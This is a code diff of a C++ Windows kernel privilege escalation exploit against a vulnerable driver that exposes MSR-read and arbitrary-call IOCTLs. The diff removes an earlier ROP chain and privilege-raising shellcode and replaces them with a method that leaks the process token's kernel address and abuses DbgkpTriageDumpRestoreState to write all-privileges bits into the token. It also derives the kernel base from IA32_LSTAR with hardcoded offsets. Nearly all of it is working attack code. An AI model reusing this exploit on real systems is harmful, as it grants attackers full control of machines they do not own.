@@ -1,22 +1,6 @@
 #include <iostream>
 #include <windows.h>
-
-char shellcode[] =
-//<increment privileges with cleanup>
-//"\x48\x89\xC2\x48\x8B\x08\x48\x0F\xBA\xE9\x02\x48\x0F\xBA\xE9\x3F\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00\x4C\x8B\x80\xB8\x04\x00\x00\x49\x83\xE0\xF0\x49\xB9\xBC\xFF\xFF\xF2\x1F\x00\x00\x00\x4D\x89\x48\x40\x4D\x89\x48\x48\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x40\x28\x48\x2D\x18\x08\x00\x00\x48\x89\x44\x24\x10\x48\x89\xC8\xC3";
-
-
-//<increment privileges with cleanup and rax = 0>
-//"\x48\x89\xC2\x48\x8B\x08\x48\x0F\xBA\xE9\x02\x48\x0F\xBA\xE9\x3F\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00\x4C\x8B\x80\xB8\x04\x00\x00\x49\x83\xE0\xF0\x49\xB9\xBC\xFF\xFF\xF2\x1F\x00\x00\x00\x4D\x89\x48\x40\x4D\x89\x48\x48\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x40\x28\x48\x2D\x18\x08\x00\x00\x48\x89\x44\x24\x18\x48\x89\xC8\xC3";
-
-//<increment privileges with cleanup and rax = 0 and final wbinvd>
-"\x48\x89\xC2\x48\x8B\x08\x48\x0F\xBA\xE9\x02\x48\x0F\xBA\xE9\x3F\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00\x4C\x8B\x80\xB8\x04\x00\x00\x49\x83\xE0\xF0\x49\xB9\xBC\xFF\xFF\xF2\x1F\x00\x00\x00\x4D\x89\x48\x40\x4D\x89\x48\x48\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x40\x28\x48\x2D\x18\x08\x00\x00\x48\x89\x44\x24\x20\x48\x89\xC8\xC3";
-
-
-
-
-
-
+#include <winternl.h>
 
 typedef struct _IO_TIMER* PIO_TIMER;
 typedef short CSHORT;
@@ -31,6 +15,7 @@ typedef short CSHORT;
 
 DWORD64 g_ntbase = 0;
 DWORD64 g_kisystemcall64shadow = 0;
+DWORD64 g_kisystemcall64 = 0;
 
 typedef struct _VPB {
 	CSHORT Type;
@@ -322,6 +307,56 @@ typedef struct DECLSPEC_ALIGN(MEMORY_ALLOCATION_ALIGNMENT) _DEVICE_OBJECT {
 typedef struct _DEVICE_OBJECT* PDEVICE_OBJECT;
 
 
+//0x18 bytes (sizeof)
+struct _SEP_TOKEN_PRIVILEGES
+{
+	ULONGLONG Present;                                                      //0x0
+	ULONGLONG Enabled;                                                      //0x8
+	ULONGLONG EnabledByDefault;                                             //0x10
+};
+
+//0x498 bytes (sizeof)
+typedef struct _TOKEN
+{
+	struct _TOKEN_SOURCE TokenSource;                                       //0x0
+	struct _LUID TokenId;                                                   //0x10
+	struct _LUID AuthenticationId;                                          //0x18
+	struct _LUID ParentTokenId;                                             //0x20
+	union _LARGE_INTEGER ExpirationTime;                                    //0x28
+	struct _ERESOURCE* TokenLock;                                           //0x30
+	struct _LUID ModifiedId;                                                //0x38
+	struct _SEP_TOKEN_PRIVILEGES Privileges;                                //0x40
+	PBYTE useless;
+}TOKEN, * PTOKEN;
+
+#define SystemHandleInformation 0x10
+#define SystemHandleInformationSize 1024 * 1024 * 2
+
+using fNtQuerySystemInformation = NTSTATUS(WINAPI*)(
+	ULONG SystemInformationClass,
+	PVOID SystemInformation,
+	ULONG SystemInformationLength,
+	PULONG ReturnLength
+	);
+
+// handle information
+typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
+{
+	USHORT UniqueProcessId;
+	USHORT CreatorBackTraceIndex;
+	UCHAR ObjectTypeIndex;
+	UCHAR HandleAttributes;
+	USHORT HandleValue;
+	PVOID Object;
+	ULONG GrantedAccess;
+} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;
+
+// handle table information
+typedef struct _SYSTEM_HANDLE_INFORMATION
+{
+	ULONG NumberOfHandles;
+	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
+} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;
 
 #define SIZE_BUF 4096
 #define IOCTL_READMSR 0x22e09c
@@ -332,15 +367,15 @@ typedef struct _DEVICE_OBJECT* PDEVICE_OBJECT;
 
 HANDLE g_device;
 
-void printBuffer(PCHAR buf,char* name,SIZE_T size) {
+void printBuffer(PCHAR buf, char* name, SIZE_T size) {
 	printf("%s:\n", name);
 	for (int i = 0; i < size; i++) {
-		printf("buf[%d] = 0x%x\n", i,buf[i]);
+		printf("buf[%d] = 0x%x\n", i, buf[i]);
 	}
 
 }
 
-BOOL readMSR(DWORD msr_value,PVOID outputBuffer, SIZE_T outSize) {
+BOOL readMSR(DWORD msr_value, PVOID outputBuffer, SIZE_T outSize) {
 	char* inputBuffer = (char*)VirtualAlloc(
 		NULL,
 		SIZE_BUF,
@@ -353,11 +388,11 @@ BOOL readMSR(DWORD msr_value,PVOID outputBuffer, SIZE_T outSize) {
 		return -2;
 
 	printf("[+] User buffer allocated: 0x%8p\n", inputBuffer);
-	
+
 
 	DWORD bytesRet = 0;
 
-	
+
 	BOOL res = DeviceIoControl(
 		g_device,
 		IOCTL_READMSR,
@@ -374,6 +409,29 @@ BOOL readMSR(DWORD msr_value,PVOID outputBuffer, SIZE_T outSize) {
 		printf("[-] DeviceIoControl failed with error: %d\n", GetLastError());
 	}
 	return res;
+}
+
+PVOID GetKAddrFromHandle(HANDLE handle) {
+	ULONG returnLength = 0;
+	fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
+	PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);
+	NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLength);
+
+	ULONG numberOfHandles = handleTableInformation->NumberOfHandles;
+
+	HeapFree(GetProcessHeap(), 0, handleTableInformation);
+	handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, numberOfHandles * sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO) + sizeof(SYSTEM_HANDLE_INFORMATION) + 0x100);
+	NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, numberOfHandles * sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO) + sizeof(SYSTEM_HANDLE_INFORMATION) + 0x100, &returnLength);
+
+	for (int i = 0; i < handleTableInformation->NumberOfHandles; i++)
+	{
+		SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation->Handles[i];
+
+		if (handleInfo.HandleValue == (USHORT)handle && handleInfo.UniqueProcessId == GetCurrentProcessId())
+		{
+			return handleInfo.Object;
+		}
+	}
 }
 
 unsigned int ExtractPml4Index(PVOID address)
@@ -420,151 +478,58 @@ BOOL arbitraryCallDriver(PVOID outputBuffer, SIZE_T outSize) {
 	memset(driverObject, 0x50, SIZE_BUF);
 	printf("[+] driverObject = 0x%p\n", driverObject);
 	char* ptrDriver = driverObject + 0x30;
-	char* pDriverFunction = ptrDriver + 0x1b*8+0x70;
+	char* pDriverFunction = ptrDriver + 0x1b * 8 + 0x70;
 
-	*((PDWORD64)pDriverFunction) = g_ntbase+ 0x40ac03;   //mov esp, ebx; ret
+	* ((PDWORD64)pDriverFunction) = g_ntbase + 0x7f06a0;   //address of DbgkpTriageDumpRestoreState
 
-	ptr->AttachedDevice = (PDEVICE_OBJECT)(object2 + 0x30);
 
-	
-	memset(ptr->AttachedDevice, 0x42, SIZE_BUF-0x40);
+	memset(ptr->AttachedDevice, 0x42, SIZE_BUF - 0x40);
 	//*((DWORD*)ptr->AttachedDevice) = 0xf6000000;
 
 	printf("[+] ptr->AttachedDevice = 0x%p\n", ptr->AttachedDevice);
-	
-	PULONGLONG fake_stack = (PULONGLONG)VirtualAlloc((LPVOID)0x00000000feffe000, 0x12000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	
-	if (fake_stack == 0) {
-		printf("[-] VirtualAlloc failed with error: %d\n", GetLastError());
-		exit(0);
-	}
-	printf("[*] fake_stack = 0x%p\n", fake_stack);
-
-	PULONGLONG ropStack = (PULONGLONG)fake_stack + 0x2000;
-
-	if (!VirtualLock((char*)ropStack - 0x3000, 0x10000)) {
-		printf("[-] virtualLock failed with error: %d\n", GetLastError());
-		exit(0);
-	}
-
-	memset(fake_stack, 0x41, 0x12000);
-	
-	printf("[+] VirtualLock returned successfully\n");
-
-	printf("[*] ropStack = 0x%p\n", ropStack);
-	DWORD index = 0;
 
 
-	char* scbase = (char*)VirtualAlloc((LPVOID)0x1a1a1a000000, 0x5000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	if (!VirtualLock(scbase, 0x5000)) {
-		printf("[-] virtualLock failed with error: %d\n", GetLastError());
-		exit(0);
-	}
-	memset(scbase, 0x42, 0x5000);
-	char* sc = scbase + 0x3500;
-	memcpy(sc, shellcode, sizeof(shellcode));
+	HANDLE TokenHandle = NULL;
+	PVOID tokenAddr = NULL;
+	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &TokenHandle))
+		tokenAddr = GetKAddrFromHandle(TokenHandle);
+	printf("tokenHandle = 0x%p\n", TokenHandle);
+	printf("tokenAddr = 0x%p\n", tokenAddr);
 
+	char* token_buf = (char*)VirtualAlloc(
+		NULL,
+		SIZE_BUF,
+		MEM_COMMIT | MEM_RESERVE,
+		PAGE_EXECUTE_READWRITE);
 
-	unsigned int pml4shellcode_index = ExtractPml4Index(sc);
-	printf("[*] sc = 0x%p\n", sc);
-	printf("[*] pml4shellcode_index 0x%p\n", pml4shellcode_index);
-
-	//<get base from nt!MiGetPteAddress+0x13>
-	ropStack[index] = g_ntbase + 0x203beb; index++; // pop rax; ret;
-	ropStack[index] = g_ntbase + 0x2abaf7; index++; // address of nt!MiGetPteAddress+0x13
-	ropStack[index] = g_ntbase + 0x235aa6; index++; // mov rax, qword ptr [rax]; ret;
-	//<get base from nt!MiGetPteAddress+0x13>
-
-	//<get pml4Index>
-	ropStack[index] = g_ntbase + 0x34bb9c; index++; // pop rdx; ret;
-	ropStack[index] = 0x1ff; index++; // 0x1ff
-	ropStack[index] = g_ntbase + 0x752664; index++;// shr rax, 0xc; ret;
-	ropStack[index] = g_ntbase + 0x752664; index++;// shr rax, 0xc; ret;
-	ropStack[index] = g_ntbase + 0x752664; index++;// shr rax, 0xc; ret;
-	ropStack[index] = g_ntbase + 0x38738b; index++;//shr rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x358532; index++;// and rax, rdx; ret;
-	//<get pml4index> now pml4index in rax
-
-	//<move pml4index in rcx>
-	ropStack[index] = g_ntbase + 0x34bb9c; index++;// pop rdx; ret;
-	ropStack[index] = (ULONGLONG)&ropStack[index + 3]; index++;
-	ropStack[index] = g_ntbase + 0x35dbc9; index++; // mov qword ptr [rdx], rax; ret;
-	ropStack[index] = g_ntbase + 0x2053e5; index++; // pop rcx; ret;
-	ropStack[index] = 0x4141414141414141; index++;//dummy
-	//<mov pml4index in rcx>
-
-	//<get pml4 address>
-	ropStack[index] = g_ntbase + 0x203beb; index++;// pop rax; ret;
-	ropStack[index] = 0xffff; index++;
-	//first round
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x24d001; index++;// or rax, rcx; ret;
-	//second round
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x24d001; index++;// or rax, rcx; ret;
-	//third round
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x24d001; index++;// or rax, rcx; ret;
-	//fourth round
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x24d001; index++;// or rax, rcx; ret;
-	//fifth round
-	ropStack[index] = g_ntbase + 0x322d1b; index++;// shl rax, 0xc; ret;
-	ropStack[index] = g_ntbase + 0x2053e5; index++; // pop rcx; ret;
-	ropStack[index] = (DWORD64)pml4shellcode_index * 8; index++;
-	ropStack[index] = g_ntbase + 0x24d001; index++;// or rax, rcx; ret;
-	//<get pml4 address> pml4 address in rax
-	
-	//<clean owner bit O=S position 2>
-	ropStack[index] = g_ntbase + 0x34bb9c; index++;// pop rdx; ret;
-	ropStack[index] = 0x2; index++;
-	ropStack[index] = g_ntbase + 0x354294; index++;// btr qword ptr [rax], rdx; ret;
-	//<clean owner bit O=S position 2>
-
-	//<clean NX bit position 63>
-	ropStack[index] = g_ntbase + 0x34bb9c; index++;// pop rdx; ret;
-	ropStack[index] = 63; index++;
-	ropStack[index] = g_ntbase + 0x354294; index++;// btr qword ptr [rax], rdx; ret;
-	//<clean NX bit position 63>
-
-	ropStack[index] = g_ntbase + 0x370050; index++; // wbinvd; ret;
-
-	//<shellcode>
-	ropStack[index] = (ULONGLONG)sc; index++;
-
-	//<cleanup>
-	ropStack[index] = g_ntbase + 0x35dbc9; index++; // mov qword ptr [rdx], rax; ret;
-	ropStack[index] = g_ntbase + 0x3d4cba; index++; // xor rax, rax; ret;
-	ropStack[index] = g_ntbase + 0x370050; index++; // wbinvd; ret;
-	ropStack[index] = g_ntbase + 0x20505a; index++; // pop rsp; ret;
-	ropStack[index] = 0x4141414141414141; index++; // filled with rsp value
-	//<cleanup>
-
-#ifdef _DEBUG
-	for (int i = 0; i < index; i++) {
-		printf("ropStack[%d] %p : 0x%p\n", i, &ropStack[i], ropStack[i]);
-	}
-#endif
 	ptr->AttachedDevice->DriverObject = (_DRIVER_OBJECT*)ptrDriver;
 	ptr->AttachedDevice->AttachedDevice = 0;
+
+
+	//kernel address of token privileges
+	DWORD64 kaddr_tokenprivileges = (DWORD64)tokenAddr + 0x40;
+
+	//ptr->AttachedDevice corresponds to rcx when we hijack execution to DbgkpTriageDumpRestoreState
+	//offset 0x10 (AttachedDevice->NextDevice) we store the value of the arbitrary write
+
+	ptr->AttachedDevice->NextDevice = (_DEVICE_OBJECT*)0x0000001ff2ffffbc;  //value of arbitrary write
+
+	//offset 0x0 (AttachedDevice->Type,Size,ReferenceCount) we store the address that is stored in rdx by DbgkpTriageDumpRestoreState
+	PDWORD64 prdx_val = (PDWORD64)ptr->AttachedDevice;
+	*prdx_val = (DWORD64)kaddr_tokenprivileges - 0x2078;
+
+
 	char* ptr2 = inputBuffer;
 	*(ptr2) = 0;
 	ptr2 += 1;
 	*((PDWORD64)ptr2) = (DWORD64)ptr;
-	
+
 
 	printf("[+] User buffer allocated: 0x%8p\n", inputBuffer);
 
 	DWORD bytesRet = 0;
 
+	getchar();
 	BOOL res = DeviceIoControl(
 		g_device,
 		IOCTL_ARBITRARYCALLDRIVER,
@@ -608,6 +573,8 @@ int main()
 
 	printf("[+] Opened handle to device: 0x%8p\n", g_device);
 #endif
+
+
 	char* outputBuffer = (char*)VirtualAlloc(
 		NULL,
 		SIZE_BUF,
@@ -617,7 +584,7 @@ int main()
 
 	memset(outputBuffer, 0x0, SIZE_BUF);
 
-#ifndef DEBUG
+#ifndef _DEBUG
 
 	//if (readMSR(IA32_GS_BASE, outputBuffer, SIZE_BUF)) {
 	//	printf("[+] readMSR success.\n");
@@ -630,8 +597,8 @@ int main()
 		printf("[+] readMSR success.\n");
 		printf("[+] IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 12)));
 		//printf("[+] IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 4)));
-		g_kisystemcall64shadow = *((DWORD64*)(outputBuffer + 12));
-		g_ntbase = (DWORD64)g_kisystemcall64shadow - 0xaf61c0;
+		g_kisystemcall64 = *((DWORD64*)(outputBuffer + 12));
+		g_ntbase = (DWORD64)g_kisystemcall64 - 0x42b700;
 		printf("[+] g_ntbase = 0x%p\n", g_ntbase);
 	}
 #endif
